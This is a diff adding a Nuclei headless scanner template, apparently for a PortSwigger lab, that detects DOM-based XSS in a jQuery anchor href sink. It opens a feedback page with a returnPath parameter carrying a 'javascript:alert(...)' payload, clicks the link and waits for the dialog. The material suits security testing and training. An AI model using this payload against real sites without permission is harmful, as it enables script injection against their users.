@@ -1,0 +1,36 @@
+# run with flag $ nuclei -headless
+
+
+id: lab-jquery-href-attribute-sink
+
+info:
+  name: lab-jquery-href-attribute-sink
+  author: FIR_UIII
+  severity: high
+  description: DOM XSS in jQuery anchor href attribute sink using location.search source
+  tags: XSS,portswigger
+
+headless:
+  - steps: 
+      - action: navigate
+        args:
+          url: "{{BaseURL}}/feedback?returnPath=/"
+          
+      - action: navigate
+        args:
+          url: "{{BaseURL}}/feedback?returnPath=javascript:alert(document.location.search)"
+
+      - action: click
+        args: 
+          by: xpath
+          xpath: /html/body/div[2]/section/div/form/div/a
+
+      - action: waitdialog
+        name: reflected_text_query
+        args:
+          max-duration: 5s
+
+    matchers:
+      - type: dsl
+        dsl:
+          - reflected_text_query == true
